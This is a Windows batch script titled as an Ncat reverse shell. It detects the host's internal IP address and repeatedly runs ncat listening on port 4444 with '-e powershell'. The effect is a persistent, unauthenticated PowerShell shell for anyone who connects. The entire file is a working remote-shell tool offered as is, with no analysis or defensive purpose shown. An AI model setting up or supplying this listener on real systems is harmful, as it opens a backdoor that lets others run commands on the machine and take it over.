@echo off
title Ncat Reverse Shell to Windows PowerShell.bat
color 0a
mode con cols=65 lines=25
goto :myipinternal
:myipinternal
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName%') do (set myipinternal=%%a)
goto :reverseshell
:reverseshell
if exist "%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" (goto :ncat)
if not exist "%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" (goto :exit)
goto :reverseshell
:ncat
cls
timeout /t 1 > nul
for %%b in ("%windir%\System32\WindowsPowerShell\v1.0\powershell") do (ncat -l %myipinternal% 4444 -v -e %%b)
timeout /t 1 > nul
cls
goto :ncat
:exit
exit
